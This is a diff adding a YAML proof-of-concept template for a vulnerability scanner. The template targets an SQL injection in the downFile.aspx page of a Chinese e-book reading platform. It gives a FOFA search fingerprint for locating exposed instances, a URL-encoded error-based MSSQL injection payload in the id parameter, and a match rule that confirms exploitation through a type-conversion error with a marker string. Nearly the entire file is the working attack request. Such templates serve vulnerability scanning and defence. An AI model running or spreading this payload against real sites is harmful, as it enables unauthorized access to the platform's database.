@@ -1,0 +1,15 @@
+id: poc-yaml-ebrp-downfile-aspx-sqli
+info:
+  name: 电子图书阅读平台 downFile.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 电子图书阅读平台
+  fofa: body="/Index.aspx/SearchBy"
+requests:
+- method: GET
+  path: /web/downFile.aspx?id=%27%2B%28SELECT+CHAR%2867%29%2BCHAR%2885%29%2BCHAR%2886%29%2BCHAR%2879%29+WHERE+1651%3D1651+AND+7828+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%287828%3D7828%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%29%2B%27
+  expression: status_code == 500 && contains(body,"在将 varchar 值") && contains(body,"qzqzq1qkxzq")
+    && contains(body,"转换成数据类型 int 时失败")
+variables: {}
+transport: http
